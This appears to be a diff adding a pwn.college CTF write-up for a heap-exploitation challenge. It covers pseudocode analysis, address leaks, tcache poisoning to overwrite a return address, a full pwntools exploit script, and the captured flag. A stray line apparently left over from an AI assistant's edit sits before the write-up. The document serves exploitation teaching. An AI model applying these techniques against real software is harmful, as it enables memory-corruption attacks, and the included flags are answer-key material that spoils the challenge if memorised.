@@ -7135,3 +7135,244 @@ pwn.college{A0nx5d15jSFQQZxlfrkuIFs1Cfb.0lN5MDL4ITM0EzW}
 
 [*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): 
 ```
+
+&nbsp;
+
+Here is the writeup with em dashes replaced by commas:
+
+## Enterprising Echo (Easy)
+
+```
+hacker@dynamic-allocator-misuse~enterprising-echo-easy:/$ /challenge/enterprising-echo-easy
+###
+### Welcome to /challenge/enterprising-echo-easy!
+###
+
+This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
+challenges, you will become familiar with the concept of heap exploitation.
+
+This challenge can manage up to 16 unique allocations.
+
+
+[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit):
+```
+
+### Binary Analysis
+
+```c title="/challenge/enterprising-echo-easy :: main() :: Pseudocode" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  // ...
+  void *ptr[16]; // [rsp+40h] [rbp-190h] BYREF
+  char s1[128];  // [rsp+C0h] [rbp-110h] BYREF
+  _BYTE v14[64]; // [rsp+140h] [rbp-90h] BYREF  <- stack_scanf writes here
+  _QWORD v15[10];// [rsp+180h] [rbp-50h] BYREF  <- stack_free frees this
+  // ...
+
+  // stack_free
+  printf("[*] free(%p)\n", v15);
+  free(v15);
+
+  // stack_scanf
+  printf("[*] scanf(\"%%127s\", %p)\n", v14);
+  __isoc99_scanf("%127s", v14);
+}
+```
+
+```c title="/challenge/enterprising-echo-easy :: echo() :: Pseudocode" showLineNumbers
+unsigned __int64 __fastcall echo(__int64 a1, __int64 a2)
+{
+  char **argv;
+  unsigned __int64 v5;
+
+  v5 = __readfsqword(0x28u);
+  argv = (char **)malloc(0x20u);
+  *argv = "/bin/echo";       // argv[0] = binary address (rodata)
+  argv[1] = "Data: ";        // argv[1] = binary address (rodata)
+  argv[2] = (char *)(a1 + a2);
+  argv[3] = nullptr;
+  if ( !fork() )
+  {
+    execve(*argv, argv, nullptr);
+    exit(0);
+  }
+  wait(0);
+  return __readfsqword(0x28u) ^ v5;
+}
+```
+
+This challenge combines the echo emanations and stack spoofing techniques. There is no `send_flag` or secret to leak, the goal is to overwrite `main`'s return address with `win()`.
+
+We have two useful primitives. First, the `echo` command's internal `malloc(0x20)` can be exploited just like in echo emanations to leak a binary address. Second, `stack_free` prints `v15`'s address and frees it into the tcache, giving us both a stack leak and a chunk we can use for tcache poisoning.
+
+### Binary Leak via Echo's Internal Chunk
+
+In echo emanations, `argv[1]` pointed to `v4`, a local stack variable holding `"Data:"`. In this binary, `"Data:"` is stored as a global string in rodata instead, so offset 8 gives another binary address rather than a stack address. We only get one useful leak from echo, the binary base from `argv[0]` at offset 0.
+
+```
+nm /challenge/enterprising-echo-easy | grep -E "main|win"
+# 0000000000001bc2 T main
+# 0000000000001a22 T win
+
+python3 -c "
+data = open('/challenge/enterprising-echo-easy', 'rb').read()
+print(hex(data.find(b'/bin/echo')))
+"
+# 0x33f8
+```
+
+So:
+```
+base     = bin_leak - 0x33f8
+win_addr = base + 0x1a22
+```
+
+### Stack Leak via stack_free
+
+Since echo does not give us a stack address, we use `stack_free` instead. It prints `v15`'s address before freeing it. `v15` is at `[rbp-0x50]`, so:
+
+```
+rbp      = v15_addr + 0x50
+ret_addr = rbp + 0x8 = v15_addr + 0x58
+```
+
+But `stack_free` will abort with `munmap_chunk(): invalid pointer` unless `v15` has a valid size field at `v15-0x8`. We use `stack_scanf` to forge one first. `v14` is at `[rbp-0x90]` and `v15-0x8` is at `[rbp-0x58]`, which is 56 bytes into `v14`. We write 56 bytes of padding followed by `p64(0x81)` (128 bytes with PREV_INUSE set, matching `malloc(128)` which we use for the poisoning).
+
+### Tcache Poisoning to Overwrite the Return Address
+
+After `stack_free`, `v15` is in the tcache with count=1. We then free two heap chunks of size 128 on top, making count=3 with the chain `a -> b -> v15`. We poison `a`'s `next` to `ret_addr`, orphaning `b` and `v15`. The chain becomes `a -> ret_addr` with count=3.
+
+```
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┊  tcache_perthread_struct Void                                        ┊
+┊            ┏━━━━━━━━━━━━━━━━┓                                        ┊
+┊    counts: ┃ count_128: 3   ┃                                        ┊
+┊            ┣━━━━━━━━━━━━━━━━┫                                        ┊
+┊   entries: ┃ entry_128: &A  ┃                                        ┊
+┊            ┗━━━━━━━━━━━━━━━━┛                                        ┊
+└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
+                              │
+              ╭───────────────╯
+              │
+              v
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┆  tcache_entry A  ┆
+├──────────────────┤
+│ next: ret_addr   │ ────╮  (B and v15 orphaned)
+├──────────────────┤     │
+│    key: Void     │     │
+└──────────────────┘     │
+                         │
+         ╭───────────────╯
+         │
+         v
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┆  STACK (ret_addr)         ┆
+├──────────────────────────┤
+│  main's return address    │
+└──────────────────────────┘
+```
+
+Then:
+- `malloc(0)` pops `A`, count=2, head=`ret_addr`
+- `malloc(1)` count=2 so tcache used, pops `ret_addr`, count=1
+- `scanf(1, p64(win_addr))` overwrites the return address with `win`
+- `quit` triggers `main`'s return, jumping to `win()`
+
+### Exploit
+
+```python title="~/script.py" showLineNumbers
+from pwn import *
+
+p = process("/challenge/enterprising-echo-easy")
+
+p.recvuntil(b"quit): ")
+
+def malloc(idx, size):
+    p.sendline(b"malloc")
+    p.sendline(str(idx).encode())
+    p.sendline(str(size).encode())
+    p.recvuntil(b"quit): ")
+
+def free(idx):
+    p.sendline(b"free")
+    p.sendline(str(idx).encode())
+    p.recvuntil(b"quit): ")
+
+def echo_raw(idx, offset):
+    p.sendline(b"echo")
+    p.sendline(str(idx).encode())
+    p.sendline(str(offset).encode())
+    p.recvuntil(b"Data: ")
+    data = p.recvuntil(b"\n", drop=True)
+    p.recvuntil(b"quit): ")
+    return data
+
+def scanf(idx, data):
+    p.sendline(b"scanf")
+    p.sendline(str(idx).encode())
+    p.sendline(data)
+    p.recvuntil(b"quit): ")
+
+# binary leak via echo chunk reuse
+malloc(0, 32)
+free(0)
+echo_raw(0, 0)
+bin_leak = echo_raw(0, 0).ljust(8, b"\x00")[:8]
+bin_addr = u64(bin_leak)
+base     = bin_addr - 0x33f8
+win_addr = base + 0x1a22
+print(f"[*] base:     {hex(base)}")
+print(f"[*] win:      {hex(win_addr)}")
+
+# forge fake chunk header at v15-0x8 (56 bytes into v14)
+p.sendline(b"stack_scanf")
+p.sendline(b"A" * 56 + p64(0x81))
+p.recvuntil(b"quit): ")
+
+# stack_free puts v15 into tcache (count=1), leak its address
+p.sendline(b"stack_free")
+p.recvuntil(b"free(")
+v15_addr = int(p.recvuntil(b")").strip(b")"), 16)
+rbp      = v15_addr + 0x50
+ret_addr = rbp + 0x8
+print(f"[*] v15:      {hex(v15_addr)}")
+print(f"[*] rbp:      {hex(rbp)}")
+print(f"[*] ret_addr: {hex(ret_addr)}")
+p.recvuntil(b"quit): ")
+
+# free two heap chunks on top of v15: count=3, chain=a->b->v15
+malloc(0, 128)
+malloc(1, 128)
+free(1)
+free(0)
+
+# poison a's next to ret_addr: chain=a->ret_addr, count=3
+scanf(0, p64(ret_addr))
+
+# malloc(0) pops a, count=2, head=ret_addr
+malloc(0, 128)
+# malloc(1) pops ret_addr, count=1
+malloc(1, 128)
+# overwrite return address with win
+scanf(1, p64(win_addr))
+
+p.sendline(b"quit")
+print(p.recvall().decode())
+```
+
+```
+hacker@dynamic-allocator-misuse~enterprising-echo-easy:/$ python ~/script.py 
+[+] Starting local process '/challenge/enterprising-echo-easy': pid 24642
+[*] base:     0x58bbd3665000
+[*] win:      0x58bbd3666a22
+[*] v15:      0x7fff3d4a7270
+[*] rbp:      0x7fff3d4a72c0
+[*] ret_addr: 0x7fff3d4a72c8
+[+] Receiving all data: Done (101B)
+[*] Process '/challenge/enterprising-echo-easy' stopped with exit code -11 (SIGSEGV) (pid 24642)
+
+### Goodbye!
+You win! Here is your flag:
+pwn.college{cLzcd_6TOaMPcuAj43NM-8jtBDS.01N5MDL4ITM0EzW}
+```
